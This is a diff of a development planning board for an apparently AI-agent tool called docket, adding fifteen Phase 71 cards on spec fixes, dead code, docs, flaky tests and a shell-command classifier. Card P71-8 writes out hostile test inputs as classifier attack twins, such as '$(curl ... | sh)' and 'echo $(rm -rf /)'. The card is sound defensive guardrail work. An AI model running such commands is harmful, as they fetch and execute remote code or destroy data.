@@ -16,14 +16,14 @@
 > Parallel lanes are allowed only when they share no file, spec, persisted state or live environment;
 > finishing a card well matters more than running two at once.
 >
-> ## ▶ BOARD — no active phase; Phases 69 (D-90) and 70 (D-91) closed 2026-11-07; Phases 67 (D-88) and 68 (D-89) closed 2026-11-06, Phase 66 (D-87) closed 2026-11-05
+> ## ▶ ACTIVE BOARD — WAVE 71 · Phase 71 (triage of 2026-11-08, 15 cards, P71-10 blocked on the maintainer); Phases 69 (D-90) and 70 (D-91) closed 2026-11-07; Phases 67 (D-88) and 68 (D-89) closed 2026-11-06, Phase 66 (D-87) closed 2026-11-05
 >
 > **Phases 69 and 70 closed 2026-11-07** (D-90, D-91; not pushed), workers on Sonnet and Haiku only: docket has an agent
 > eval lane (`evals/`, five suites, 109 tasks with hidden checks, pass@k and pass^k, a base per commit) and the 4,200-line
 > canary is deleted; the guardrails are one source per check, measured on the lane's safety suite (attack success 0.00
 > before and after, twin utility 0.92 to 1.00, false positives 3 to 0). Their sections are archived and what they leave
-> open is under "Evals and guardrails" in the follow-ups below. No card is ready: the next phase needs triage or a
-> measured trigger.
+> open is under "Evals and guardrails" in the follow-ups below. **Phase 71** (below) is the triage of every follow-up on
+> 2026-11-08, with the maintainer's request for a deep clean of dead code and documents.
 > **Phases 67 and 68 closed 2026-11-06** (D-88, D-89; not pushed): a folder pod under the jail reads any public host and
 > says how (`webRead`), a compaction that gains nothing no longer kills a turn, a file that mentions payments is not a
 > payment, the writer drafts instead of researching, and search is a declared service. Their real run (P68-6, which
@@ -100,6 +100,313 @@ scope in one pass over the same files, parks at least once.
 by a fast-forward from `develop` when the maintainer cuts a release. Tags and release jobs originate
 from `main`.
 
+## ▶ PHASE 71 ACTIVE — WAVE 71 · what the follow-ups' fired triggers and verified drift leave, and a deep clean (triage 2026-11-08, no new decision)
+
+> **Trigger: the maintainer's request for a triage of the follow-ups (2026-11-08).** Every follow-up was read and
+> each candidate re-checked in code on `develop` `e347980c`, and the live home measured from 2026-11-03 to the last
+> event, 2026-11-06T13:43Z (16 tasks, 311 `llm_call`s, pods `web-research`, `app-dev`, `hn-live`). Cards exist only
+> where a trigger fired with that evidence, or the text of a spec or comment is false against the code. The
+> follow-ups these cards replace, and those found stale, are removed from the list below.
+>
+> - **Fired:** shell-idiom approvals (5 of 9 Implementer hops parked on `$(`/`${`/a `/tmp` redirect, threshold 1 in
+>   5; all five in `task-69fa3927`, 2026-11-04): P71-8. `messages_changed` on 25 % of the window's calls and 47 %
+>   and 43 % of its two largest tasks (threshold 20 %): P71-10. Three flakes under load in one test class: P71-9.
+>   P63-2 landed, which was the A2A card's trigger: P71-6.
+> - **False against the code:** spec and doc text (P71-1, P71-2), the init order requirement 16 promises (P71-3),
+>   two comments that state a wrong rule (P71-4), a flush error dropped silently (P71-5), names written twice (P71-7).
+> - **Re-measured, not fired:** a parked turn is no longer paid twice (5 of 6 resumes kept the cache, about 2k
+>   uncached tokens each; the sixth was the compaction P68-1 fixed); streaming (3 timeouts, all in one task, 0.48
+>   per 50 calls against 1); the long docstring count is 202, under the 205 it was measured against.
+>
+> - **The maintainer's request (2026-11-08):** a deep clean of dead code and every document brought to what holds,
+>   deleting what no longer does: P71-11 (dead code, measured with vulture over the whole repository), P71-12 to
+>   P71-15 (each document checked claim by claim against its spec and the code). The integrator rewrites `README.md`
+>   from their reports at the close.
+>
+> **Waves by file ownership.** Wave 1, parallel: P71-1, P71-2, P71-3, P71-4, P71-5, P71-6, P71-7, P71-9, P71-11,
+> P71-13, P71-14, P71-15 (no two share a file or a spec; one worker may run several S cards in a row). Wave 2: P71-12
+> after P71-2 (`CONFIGURATION.md`), P71-8 after P71-4 and P71-14 (`governance/security.py`, `SECURITY-SIMPLE.md`).
+> P71-10 waits for the maintainer.
+> P71-8 and P71-10 change what the agent sees or may do, so they name a suite, a threshold and the base `e347980c`.
+
+### P71-1 — Six specs say what the code does
+
+**Status:** TODO · **Size:** S · **Model:** Haiku · **Kind:** spec text only
+
+- **Trigger:** verified 2026-11-08: each line below is false against the code at `e347980c`.
+- **Goal:**
+  1. Delete the `memory/` token, keeping `MEMORY.md`: `specs/api/cli-interface.spec.md:472`,
+     `specs/acceptance/user-stories.md:63`, `specs/functional/agent-lifecycle.spec.md:153`. No member workspace
+     has a `memory/` directory (`rg 'memory/' src/docket/teams` is empty; `teams/agent_memory.py:28`).
+  2. `specs/functional/trace-store.spec.md` items 30-32: an MCP server's `process_*` payload is
+     `{"tool": "mcp", "server": <name>[, "reason": <text>]}` with no `pgid`
+     (`agent/tools/mcp_client.py:437-439`). Name the exception; leave every other process event as stated.
+  3. `specs/functional/audit.spec.md:85-90` "Pods and agents": add `pod.network_widen`, `pod.network_narrow`
+     (`interfaces/cli/commands/pod_settings.py:230,273`), `pod.fetch_widen` and `pod.fetch_narrow`
+     (`teams/pod_settings.py:760,774`).
+  4. `specs/functional/config-format.spec.md:115`: `load_pipeline(text, *, roles)` (`pipeline/domain/spec.py:398`).
+- **Non-goals:** any code change; any other spec.
+- **Change:** the six spec files; bump each one's patch version.
+- **Acceptance:** each claim above reads like its locator; `rg -n 'memory/' specs/api/cli-interface.spec.md
+  specs/acceptance/user-stories.md specs/functional/agent-lifecycle.spec.md` is empty.
+- **Gate:** `bash scripts/validate-specs.sh` (about 3 s). No tests.
+
+### P71-2 — The home layout and `pod update` list the routines, services and records they carry
+
+**Status:** TODO · **Size:** S · **Model:** Haiku · **Kind:** data + spec text
+
+- **Trigger:** verified 2026-11-08: `kernel/layout.py:39-42` and `docs/CONFIGURATION.md:69-72` list
+  `docket-schedules.json`, `docket-runs.json` and `docket-conversations.json` but not `state/docket-routines.json`
+  (written by `kernel/home.py:416`); `specs/functional/pod-blueprints.spec.md:251-275` (requirement 1, the
+  `pod update` parts) names no `services/`, `records/` or `routines/`, which `teams/apply/plan.py:556,566` plans
+  and `docs/CONFIGURATION.md:802` already lists.
+- **Goal:** add the routines entry to the layout tuple; add three bullets to requirement 1 (`CONFIGURATION.md` is P71-12's).
+- **Non-goals:** any change to what `pod update` does.
+- **Change:** `kernel/layout.py`, `pod-blueprints.spec.md` (patch bump); the unit test whose
+  `SUBJECT` is `kernel/layout.py` if it enumerates the tuple (`rg -l 'kernel/layout.py' tests/unit`).
+- **Acceptance:** the layout's state files name every file `kernel/home.py` writes under `state/`; the layout test passes.
+- **Gate:** the layout unit test; `validate-specs.sh` (about 3 s).
+
+### P71-3 — `docket init --blueprint respond` names the jail it needs after recording it
+
+**Status:** TODO · **Size:** S · **Model:** Sonnet · **Kind:** behaviour (CLI output order)
+
+- **Trigger:** deterministic. `pod-blueprints.spec.md:534-536` (requirement 16) says the `needs fetch-hosts ...`
+  line is printed after isolation is recorded. Actual: `cmd_init` builds the pod (`interfaces/cli/commands/agents.py`
+  ~382), which prints through `render_reading_need` (`interfaces/cli/commands/pod.py:111`,
+  `render/apply.py:105-111`), and only then calls `_setup_sandbox.turn_on_where_detected()` (`agents.py:410`;
+  `:579` on the batch path). A throwaway home printed "-> docket setup sandbox on" and then `pod show` said the
+  jail was on (2026-11-04). With `--recipe` and a researcher the line can print twice (`render_recipe_needs`,
+  `agents.py:417`).
+- **Goal:** `build_pod_from_blueprint` stops printing; `cmd_init` prints the reading need once, after
+  `turn_on_where_detected()`, on both paths, and not again when `render_recipe_needs` printed it. `pod add`
+  (`pod_members.py:128`) is unchanged.
+- **Non-goals:** the wording of the line; refusing a folder inside a repository (separate follow-up).
+- **Change:** `interfaces/cli/commands/pod.py`, `interfaces/cli/commands/agents.py`, the init CLI test
+  (`rg -l 'blueprint.*respond' tests/unit/interfaces/cli tests/integration/interfaces`).
+- **Acceptance (RED first):** on a home where a backend is detected, `docket init p --blueprint respond` output shows
+  the isolation line before any `needs fetch-hosts` line, and the line appears once; with `--recipe` naming a
+  researcher, once. The golden for `init`, if one covers it, moves only by that order (say so in the commit body).
+- **Gate:** the init test file; `bash tests/golden/run.sh verify-all` only if a golden covers init (about 20 s).
+
+### P71-4 — Two comments that state a wrong rule
+
+**Status:** TODO · **Size:** S · **Model:** Haiku · **Kind:** comments only
+
+- **Trigger:** verified 2026-11-08. `governance/security.py:86-98` says `HighRiskClass.bins` is "for visibility
+  only", and the test comment at `tests/integration/governance/test_gates_policies_approve_deny.py:101-103` says
+  nothing else wants the flattened set; `teams/pod_settings.py:345-358` refuses an `allowCommands` name in it (so the
+  follow-up "delete `bins`" is withdrawn: `pattern` is a regex and cannot give the binaries).
+  `teams/builtin_roles.py:68` says "forward-compat, not exercised today".
+- **Goal:** the docstring says `bins` feeds the display and the `allowCommands` refusal; the test comment says the
+  same; line 68 states the rule it guards or goes.
+- **Non-goals:** any code change. **Change:** the three files.
+- **Acceptance:** `scripts/maint/comment_lint.py --check` on the three files passes; the per-commit check passes.
+- **Gate:** per-commit only (about 4 s).
+
+### P71-5 — The service's notify flush says when a channel failed
+
+**Status:** TODO · **Size:** S · **Model:** Sonnet · **Kind:** behaviour
+
+- **Trigger:** verified 2026-11-08: `interfaces/http/server.py:230-231` calls `flush_notify_channels(...)` inside
+  `contextlib.suppress(Exception)`; the function returns `None` (`operator/notify.py:523-527`) and drops
+  `FlushReport.error` (`:93`), so a channel that fails every flush is silent in `docket start`'s output.
+- **Goal:** `flush_notify_channels` returns the `FlushReport`; the sweep prints `[serve] sweep: notify flush: <error>`
+  when `error` is set, in the format of the sweep's other lines. Delivery and the health record are unchanged.
+- **Change:** `operator/notify.py`, `interfaces/http/server.py`, `operator-loop.spec.md` if it states the sweep's
+  lines (patch bump), the unit test whose `SUBJECT` is `operator/notify.py`.
+- **Acceptance (RED first):** a channel whose sink raises gives a `FlushReport` with `error`, and the sweep tick's
+  captured output names it; a clean flush prints nothing new.
+- **Gate:** the notify unit file and the server test that drives a sweep tick (`rg -l 'notify' tests/integration/interfaces/http`).
+
+### P71-6 — The A2A agent card says what the pod does
+
+**Status:** TODO · **Size:** S · **Model:** Sonnet · **Kind:** behaviour (HTTP shape, additive)
+
+- **Trigger:** the follow-up's own: P63-2 landed. `interfaces/http/routes/a2a.py:263` still writes
+  `"Runs tasks in the {pod} pod."`; `pod_report` (`hops/application/report.py:413`) carries `blueprint` (`:438`)
+  and `delivers` (`:451`); the blueprint's text is `PodBlueprint.description` (`teams/blueprints.py:244-268`).
+- **Goal:** the card's skill `description` is the blueprint's description plus what the pod delivers, falling back to
+  today's sentence for a pod with neither; `tags` carries the blueprint name.
+- **Non-goals:** a `description` field on the pod (a pod has none); other card fields.
+- **Change:** `interfaces/http/routes/a2a.py`, `a2a-binding.spec.md` (additive, patch bump), the A2A contract test
+  that reads the card (`rg -l 'agent-card\|agent_card' tests/contracts tests/integration`).
+- **Acceptance (RED first):** a `respond` pod's card names the blueprint's description and its `delivers`; a pod
+  with no blueprint reads as today.
+- **Gate:** that test file; `tests/e2e -n 4` is not needed (one route's text); the HTTP API 6 tests stay as they are.
+
+### P71-7 — Names and writers that exist twice, once each
+
+**Status:** TODO · **Size:** S · **Model:** Sonnet · **Kind:** refactor, no behaviour change
+
+- **Trigger:** the maintainer's rule of 2026-11-05 (no duplicate mechanisms) and the Phase 57/56 follow-ups,
+  verified 2026-11-08: the `reply` option id in `tasks/application/answers.py:22` and `escalations.py:80`;
+  `tool_queue` and `tool_retry` repeat one dump (`interfaces/cli/commands/mcp.py:78-81,91-94`);
+  `setup_model_credentials.py:32-56` `_write_credential` repeats `governance/secrets.py:79-97` `store_secret`
+  (keyring/file split, `touch_meta`, audit); `teams/config_docs.py:23` imports itself (used `:244`).
+- **Goal:** one `REPLY_ID` in `escalations.py` imported by `answers.py`; one `_queue_dump` in `mcp.py`;
+  `_write_credential` calls `store_secret` and renders its failure (`setup_model_provider.py:126` is the caller);
+  `config_docs.py:244` uses the bare name.
+- **Non-goals:** `task_control.py`'s refusal path (unifying it moves an HTTP body); the two `_brings` (they render
+  different text).
+- **Change:** `answers.py`, `escalations.py`, `mcp.py`, `setup_model_credentials.py`, `setup_model_provider.py`,
+  `config_docs.py`.
+- **Acceptance:** no test changes; the audit row a credential write produces is byte-identical (the existing
+  `setup model` credential test is the oracle); `rg -n '"reply"' src/docket/tasks/application` hits one line.
+- **Gate:** the unit files whose `SUBJECT` is each module; `tests/architecture` (about 6 s).
+
+### P71-8 — A shell idiom whose command is known is classified, not asked
+
+**Status:** TODO · **Size:** M · **Model:** Sonnet · **Kind:** guardrail behaviour + eval task + spec · **After:** P71-4, P71-14
+
+- **Trigger (fired):** "Approvals for shell idioms" (Phases 60-62 follow-up): in the week after Phase 59 approvals
+  parked more than one Implementer hop in five. Observed 2026-11-03..06 on the live home: 6 of 9 Implementer hops
+  parked, 5 of them on these commands from `audit.log` `tool.ask` (`task-69fa3927`): `cd "$(git rev-parse
+  --show-toplevel ...)"` (3), `${PIPESTATUS[0]}` (2), `>/tmp/lint.log` (2). The cause: `_OPAQUE_MARKERS`
+  (`governance/security.py:218`) asks for any `$(`, backtick or `${`.
+- **Eval contract (before the change):** suite `safety`, k=3, local endpoint, base `e347980c`. Write first two tasks
+  under `evals/tasks/safety/`: a benign twin whose solution needs `"$(git rev-parse --show-toplevel)"` and
+  `${PIPESTATUS[0]}`, and its attack twin where the substitution runs a destructive or network command
+  (`$(curl ... | sh)`, `$(rm -rf ...)`), which must still ask or deny. Threshold: attack success stays 0.00; twin
+  utility not down more than 5 points; the new benign twin passes with no ask.
+- **Goal:** in the classifier (`security.py` ~419-460), a `$(...)` whose body is one command line with no nested
+  opaque marker is classified by the same rule as a top-level command, and the line takes the stricter verdict;
+  `${NAME}` and `${NAME[N]}` (a plain parameter, no `:-`, `/`, `#` or nested `$`) are not opaque. Backticks, `eval`,
+  `exec` and nested substitutions stay opaque. A redirect outside the workspace stays an ask (a non-goal: the jail
+  owns where writes go).
+- **Non-goals:** a shell parser; widening `SAFE_BINS`; any change with isolation on beyond what the classifier says.
+- **Change:** `governance/security.py`, `tests/unit/governance/test_security*.py` (by `SUBJECT`), the policy corpus
+  rows for `$(` if any (`rg -n '\$\(' tests/fixtures evals -g '*corpus*'`), the two eval tasks,
+  `security-gates.spec.md` (the opaque-marker requirement, minor bump), the sentence of `docs/SECURITY-SIMPLE.md` that
+  says what asks (`rg -n 'substitution' docs/SECURITY-SIMPLE.md`).
+- **Acceptance (RED first):** `git -C "$(git rev-parse --show-toplevel)" status` allows; `echo ${PIPESTATUS[0]}`
+  allows; `echo $(rm -rf /)` and `x=$(curl -s h | sh)` ask or deny exactly as their inner command would at top
+  level; `` echo `id` `` and `$(echo $(id))` ask. The integrator pastes the safety tables before and after in Status.
+- **Gate:** the unit file; `check-solutions --suite safety`; the safety run (integrator).
+
+### P71-9 — `TestAnsweredInPlace` waits for events, not the clock
+
+**Status:** TODO · **Size:** S · **Model:** Sonnet · **Kind:** test only
+
+- **Trigger (fired):** three tests of `tests/integration/tasks/test_consult_wait.py::TestAnsweredInPlace` failed
+  once each under load and passed alone (Phase 55 Wave 2 and Wave 4 follow-ups); the board's rule makes a third in
+  one class its trigger.
+- **Goal:** find the wall-clock waits the class uses (`_the_waiting_consult(deadline_s=20.0)` ~124-131, the
+  `time.sleep(0.02)` poll ~218, the sweep thread's `turn_timeout=60` ~119) and replace each with a wait on the event
+  the product emits (the escalation file appearing, the worker thread joining), with one generous deadline that
+  fails naming what it waited for.
+- **Non-goals:** product changes; other test files.
+- **Change:** `tests/integration/tasks/test_consult_wait.py` (and `tests/support/` only if a waiter there is reused).
+- **Acceptance:** the class passes 20 times in a row under `pytest -n 8` with `--count`-style repetition
+  (`for i in $(seq 20)` is fine in a shell script file, not inline), alongside a CPU load (`stress`-free: run two
+  copies at once); a planted delay in the product path fails with the waited-for name, not a timeout.
+- **Gate:** that file only.
+
+### P71-10 — A cache breakpoint at the condensed boundary
+
+**Status:** BLOCKED (needs the maintainer: D-76 refuses more than two breakpoints) · **Size:** M · **Model:** Sonnet ·
+**Kind:** wire behaviour + spec
+
+- **Trigger (fired twice):** the Phases 60-62 follow-up's threshold is `messages_changed` on more than 20 % of a real
+  task's requests. 2026-11-04: 16 of 30 calls (53 %, `task-52c89dbb`). 2026-11-03..06: 79 of 311 calls (25 %);
+  `web-research` `4538bdd6` 27 of 57 (267,948 uncached input tokens of 928,675), `app-dev` `c01138ac` 13 of 30. The
+  two breakpoints today are the last system block and the last message (`models/adapters/anthropic_wire.py:121-124`;
+  `openai_wire.py:87` for the gateway). The replay of P60-2's sizes: a third breakpoint at the first message after
+  the condensed range re-sends 31 % of what a miss re-sends now.
+- **Choice for the maintainer:** amend D-76 (and ADR 0011's amendment of 2026-10-29) to allow a third breakpoint, on
+  the last message of the condensed range (`agent/session.py:381` `condense_history` marks it), on both dialects;
+  Anthropic accepts four. The alternative: no change, and this follow-up closes as measured.
+- **Eval contract:** suite `regression`, local and Haiku 5.5, base `e347980c`; threshold: pass@1 not lower, cached
+  input tokens per task higher on the tasks that condense. Tokens only, never a price.
+- **Change (once unblocked):** the two wire adapters, the message type that carries the boundary mark
+  (`agent/ports.py`), `session-history.spec.md` (~92) and `model-providers` spec, the wire unit tests and the recorded
+  request fixtures (regenerated and reviewed).
+- **Gate:** the wire unit files; `tests/e2e -n 4` (the wire changed); the regression run (integrator).
+
+### P71-11 — Dead parameters and a dead total deleted
+
+**Status:** TODO · **Size:** S · **Model:** Sonnet · **Kind:** deletion, no behaviour change
+
+- **Trigger:** measured 2026-11-08 with `uvx vulture src/docket tests evals scripts packages --min-confidence 60`
+  (whole repository, so a name read only by a test counts as read): after the framework false positives (Typer
+  commands, pydantic validators, `HTMLParser`/`BaseHTTPRequestHandler` hooks, a property reached through
+  `kernel/home.py:23`'s name table), three names have a writer and no reader:
+  1. `on_spawn` on `RuntimeDriver.run` (`agent/ports.py:326`): the one driver left ignores it
+     (`hops/application/driver.py:145,158` "is ignored"), so `runner.py:173-198`'s `_on_spawn` never fires;
+     `tests/support/fakes.py:83-89` and the comment at `executor.py:511` follow it.
+  2. `preserve_cancelled` (`tasks/application/runs.py:223`) is accepted, passed by `:570` and `:609`, never read.
+  3. `UsageTotals.cache_write` (`agent/ports.py:272`) is summed at `driver.py:377` and never read.
+- **Goal:** delete each with its writers and callers. Before deleting 2, read `runs.py:218-262`: if a caller relies on
+  a cancelled run staying cancelled, that is a defect, not dead code; then stop and report it.
+- **Non-goals:** anything vulture reports under 100 % that a framework calls; `packages/` beyond what `rg` finds.
+- **Change:** `agent/ports.py`, `hops/application/driver.py`, `hops/application/runner.py`, `hops/application/executor.py`,
+  `tasks/application/runs.py`, `tests/support/fakes.py`; a spec line only if `rg -n 'on_spawn|preserve_cancelled' specs`
+  finds one.
+- **Acceptance:** `rg -n 'on_spawn|preserve_cancelled|\.cache_write\b' src packages tests` is empty; no test changes
+  beyond the fake; `mypy src` passes.
+- **Gate:** the unit files whose `SUBJECT` is each module; `tests/architecture`; `tests/integration/hops -n 4`
+  (about 40 s).
+
+### P71-12 — `docs/CONFIGURATION.md` says what the code reads and writes
+
+**Status:** TODO · **Size:** M · **Model:** Sonnet · **Kind:** documentation · **After:** P71-2
+
+- **Trigger:** the maintainer's request of 2026-11-08 (update every document in detail; delete what no longer holds)
+  and the project's rule that nothing in CI compares a doc to a spec (CLAUDE.md "Correct spec, wrong prose"). Known
+  instance: `CONFIGURATION.md:69-72` omits `state/docket-routines.json` (`kernel/home.py:416`).
+- **Goal:** every file, key, default and command in the document is checked against its spec, then the code
+  (`kernel/home.py`, `kernel/layout.py`, the pydantic models it names); a claim that is false is fixed, a section about
+  something deleted goes, nothing is added that the code does not do. History stays out: the document teaches what
+  is, never when it changed.
+- **Non-goals:** generated sections (regenerate them with their script, never hand-edit); a restructure.
+- **Change:** `docs/CONFIGURATION.md` only. **Report:** a list of each claim changed or deleted with the locator that
+  proved it, for the integrator's commit body.
+- **Acceptance:** the report names a locator for every change; `rg -n -i 'tamper-proof|\$[0-9]|dashboard' docs/CONFIGURATION.md`
+  is empty; `gen_cli_docs.py --check` passes.
+- **Gate:** `gen_cli_docs.py --check`, `validate-specs.sh` (about 5 s together).
+
+### P71-13 — `docs/recipes.md` and `docs/AGENT-TEAMS.md` say what the recipes and team shapes do
+
+**Status:** TODO · **Size:** M · **Model:** Sonnet · **Kind:** documentation
+
+- **Trigger:** the maintainer's request of 2026-11-08, as P71-12. Phases 69-70 deleted four policy templates and two
+  recipe rules (`high-risk-deploy`, `-credentials`, `-payment`, `secret-pii-redact`, `secrets-guard-redact-output`,
+  `prompt-injection`) and the trusted flag; the four team shapes are `build`, `respond`, `operate`, `routine`
+  (`teams/blueprints.py:238-262`).
+- **Goal:** as P71-12, against `templates/`, the recipe directories, `teams/blueprints.py` and `pod-blueprints.spec.md`;
+  `rg -n 'high-risk-deploy|high-risk-credentials|high-risk-payment|secret-pii-redact|redact-output|prompt-injection|trusted'`
+  on both files finds only what is still true.
+- **Change:** the two files (and `scripts/gen_recipe_docs.py`'s output if recipes.md is generated in part:
+  regenerate it). **Report:** as P71-12.
+- **Gate:** `gen_cli_docs.py --check`; the recipe-docs check if one exists (`rg -n 'check' scripts/gen_recipe_docs.py`).
+
+### P71-14 — `docs/SECURITY-SIMPLE.md`, `docs/troubleshooting.md` and `docs/MODEL-GATEWAYS.md` say what holds
+
+**Status:** TODO · **Size:** M · **Model:** Sonnet · **Kind:** documentation
+
+- **Trigger:** the maintainer's request of 2026-11-08, as P71-12. Phase 70 changed what these describe: one list of
+  high-risk classes applied to every acting tool, one redaction always on, tool results framed as untrusted, every
+  denial audited; the do-not-overclaim rules (no "tamper-proof", isolation's real default, enforcement covers the tool
+  calls docket dispatches) apply.
+- **Goal:** as P71-12, against `security-gates.spec.md`, `governance/`, `sandbox/` and `models/`; a troubleshooting
+  entry whose error text the code no longer prints goes (find each quoted message with `rg -F` in `src`).
+- **Change:** the three files. **Report:** as P71-12.
+- **Gate:** `rg -n -i 'tamper-proof|\$[0-9]'` on the three is empty; the alt texts still match `docs/assets/README.md`.
+
+### P71-15 — The quick start, the docs index, CONTRIBUTING and the eval lane's README say what holds
+
+**Status:** TODO · **Size:** M · **Model:** Sonnet · **Kind:** documentation
+
+- **Trigger:** the maintainer's request of 2026-11-08, as P71-12.
+- **Goal:** as P71-12 for `docs/QUICK-START-DOCKET.md`, `docs/README.md`, `CONTRIBUTING.md`, `evals/README.md` and
+  `docs/contracts/*.md`: every command in them runs as written on a fresh home (`DOCKET_HOME` in the scratchpad, the
+  installed or `uv run docket`, no model call), every link resolves, every count matches the code or goes.
+  `CONTRIBUTING.md`'s "Rules that have cost this project time" keep their reasons; a rule about something deleted goes.
+- **Non-goals:** `README.md` (the integrator rewrites it at the phase close from these reports); `docs/commands.md`
+  (generated).
+- **Change:** the files named. **Report:** as P71-12, plus each command run and its exit code.
+- **Gate:** the commands themselves; `gen_cli_docs.py --check`.
+
 ## ◇ FOLLOW-UPS WITH TRIGGERS (not cards; triage when a trigger fires)
 
 > Re-checked against the code on 2026-10-24; paths are current. Removed as no longer true: notification
@@ -125,8 +432,6 @@ from `main`.
 - **Landlock cannot deny a path inside a granted root** (P69-4 states it): the file tools and the classifier are the
   control for `.docket/` under a repository root. Trigger: a Landlock ABI that supports a deny rule, or a jail that
   bind-mounts.
-- **`HighRiskClass.bins`** (`security.py:93-96`) is display-only (`setup sandbox classes`). Delete with P70-1 if the
-  display can read the pattern instead.
 - **A model that refuses a named `tool_choice` cannot serve a pod** (`meta/muse-spark-1.3` answered HTTP 400 "only auto is
   supported" on 2026-11-06): the handoff tool is called by name. Trigger: a second such model, then `setup provider add`
   probes it and says so (model-profiles).
@@ -149,9 +454,6 @@ from `main`.
 - *`docket run`'s header and `docket setup` show the lifetime token count*, which differs from
   `budget.used` for a windowed pod; seven tests stub `pod_counted_tokens` as `lambda _p: 5` instead of taking
   `since`. A pipeline with a missing role and an out-of-pod agent reports only the roles.
-- *Stale `memory/` mentions* in `specs/api/cli-interface.spec.md`, `specs/acceptance/user-stories.md`,
-  `specs/functional/agent-lifecycle.spec.md` and `specs/test-framework.md`; `docs/recipes.md` does not mention
-  `shape`; the word "adapters" in the `_execution.py` docstring and ADR 0006.
 
 **Phase 66 (2026-11-05).** Found by the real runs (`internal-docs/baselines/phase-66/real-run.md`). Fixed after the close,
 the same day: a provider's context-overflow refusal is typed and taught to the estimate, for the task request and the
@@ -223,10 +525,6 @@ pre-turn pass (`32856e57`); the `_trace_compaction` locator note ended with Phas
   (`agent/loop_budget.py` `prospective_budget_error` ~139, `agent/loop.py` `enter_landing` ~373). Probably the
   re-fetching P68-7 removes; trigger: a researcher turn still ends this way after P68-7, then reserve the
   landing's input before a tool round starts.
-- *`docket init <pod> --blueprint respond` prints `needs fetch-hosts ... -> docket setup sandbox on` and then
-  records isolation on* (a throwaway home, 2026-11-04): `pod show` says the web is open right after. The line is
-  printed before the jail is recorded; pod-blueprints requirement 16 says it is printed after. Check the order in
-  `interfaces/cli/commands/` init.
 - *A pod made with `docket init <name> --blueprint respond` from inside a repository takes that directory as its
   folder* (the throwaway run's writer wrote `informe.md` into the working tree). Probably as designed (`location`
   defaults to the current directory); say so in `init --help`, or refuse a folder inside a git repository.
@@ -253,26 +551,14 @@ pre-turn pass (`32856e57`); the `_trace_compaction` locator note ended with Phas
 - *Streaming with an idle timeout.* A stall is only seen after `AGENT_LOOP_REQUEST_TIMEOUT_S`
   because a non-streamed reply sends nothing until it ends. Trigger: after P60-1, more than one
   `request_retry` per 50 requests over a week of the live home, or a turn that ends `timeout` after
-  its retries.
-- *A cache breakpoint at the condensed boundary.* Replayed: with P60-2's sizes, a miss would re-send
-  69 % of what it re-sends without one. Trigger: after P60-2, `messages_changed` on more than 20 % of
-  a real task's requests. **FIRED 2026-11-04:** the P67-5 task (`task-52c89dbb`, raw trace under
-  `state/traces/web-research/`) has `cacheMiss: messages_changed` on 16 of its 30 `llm_call`s (53 %); the writer's
-  requests of 19-28k tokens cached only the 2,854-token prefix. Belongs with Phase 66 (D-87), which owns the
-  request projection.
+  its retries. Observed 2026-11-03..06 (16 tasks, 311 calls): no `request_retry` in the live traces, 3
+  request timeouts, all in one task (0.48 per 50); not fired.
 - *A missing workdir folder.* Not seen: `web-research`'s exists, and Tack's `workdir: null` was the
   absent field (P61-1). Trigger: a dispatch whose recorded `workDir` is gone; then the docket-owned
   default is recreated, and a declared location becomes a profile violation and a `POST /tasks` 422.
 - *A network failure inside `bash`.* No deterministic signal; P61-5 states the posture. Trigger: a
   recorded hop that tried the network after its message said `none`.
-- *Approvals for shell idioms.* 7 of the live home's 9 failed hops (2026-10-24..11-03, mostly before
-  Phase 59) parked on `$(`, `${` or a redirect to `/tmp`. Trigger: a week after Phase 59 in which
-  approvals park more than one Implementer hop in five.
 
-**Phase 63 (planned 2026-11-03).**
-- *The A2A agent card says only "Runs tasks in the X pod"* (`interfaces/http/routes/a2a.py` ~263). Trigger:
-  P63-2 lands; then the card's skill reads the pod's `description`, `blueprint` and `delivers` from `pod_report`.
-  One line, not a card.
 
 **Toolchain read grants (dropped from Phase 48).** A sibling project's gates failed with exit 126 under the
 jail until each toolchain under `$HOME` (`~/.nvm`, `~/.pyenv`, `~/.cargo`) was granted by hand with
@@ -281,15 +567,11 @@ jail until each toolchain under `$HOME` (`~/.nvm`, `~/.pyenv`, `~/.cargo`) was g
 
 **Phase 55 Wave 1 (merged 2026-10-30).** Loose ends, none a card yet; the first two belong to the later cards
 that already own the files.
-- *Specs that lag.* `trace-store.spec.md` items 30-32 say every `process_*` payload carries `pgid`; MCP events carry
-  none. `audit.spec.md` (~line 77) omits `pod.network_widen` / `pod.network_narrow`. P55-12 or the next card that
-  edits either spec.
 - *Required variables supplied by tasks.* `dispatch_pod`'s up-front check refuses a `required` pipeline variable that
   only tasks supply. P55-9 (routines) meets it first.
 - *Smaller.* `docket task cancel` does not kill a `hop` MCP session directly (it closes at hop end); a top-level
   `networkGrant` in `pod.yaml` is an unknown-key error, not a skip (only under `settings`).
 - *Flakes under load, seen once each and passing alone:* `test_run.py::TestForegroundApprovalPrompt` (two tests),
-  `test_consult_wait.py::TestAnsweredInPlace::test_an_option_answer_goes_back_to_the_model_in_the_same_turn`,
   `test_end_to_end.py` approval-mode tests. A second failure of the same test is its trigger.
 - *Phase 55 Wave 2, P55-3.* The `outward` recipe's policy `ask` names one tool, `mcp__outbox__send`
   (`when.tool` matches an exact name), so a send tool of another name is not asked about: a kind predicate or a default
@@ -312,18 +594,15 @@ that already own the files.
     hint and `setup model list` name only the ten built-in roles; `known_role_names()` reads every overlay per call.
   - P55-4: `task show --json` carries no `call` (deliberate). The `Authorization` redaction pattern needs a token of
     about 20 characters after "Bearer". `outward` and `call` are additive to `operator-v2`; tell Tack's maintainer.
-  - P55-9: `docs/CONFIGURATION.md` and `kernel/layout.py` do not list `docket-routines.json`;
-    `pod-blueprints.spec.md` omits `routines/` from the `pod update` list; the recipe summary line does not name
+  - P55-9: the recipe summary line does not name
     routines; cron day-of-month and day-of-week are ANDed, as in the existing parser; `tzdata` is not a declared
     dependency; no `--tz`-aware `HH:MM` form. A routine fires only under `docket start --dispatch`.
     A routine skip is traced as `step_skipped` because `EVENT_TYPES` is closed.
 - *Phase 55 Wave 4.*
   - P55-8: the check and the increment of a quota are not atomic (two concurrent sends in one pod could both pass at
     count-1); an unreadable counter counts as empty; `pod policies` and `check` do not show quotas.
-  - Phase 56 Wave 2 merge run (2026-10-30), both passed alone: `test_consult_wait.py::TestAnsweredInPlace::
-    test_a_decline_tells_the_model_to_decide_itself` (a third test of that class, so the class now has three flakes
-    under load: that is its trigger), and `tests/integration/product/test_runtime_execution_envelope.py`, 8 setup
-    errors from `uv build` exiting 2 in a parallel worker.
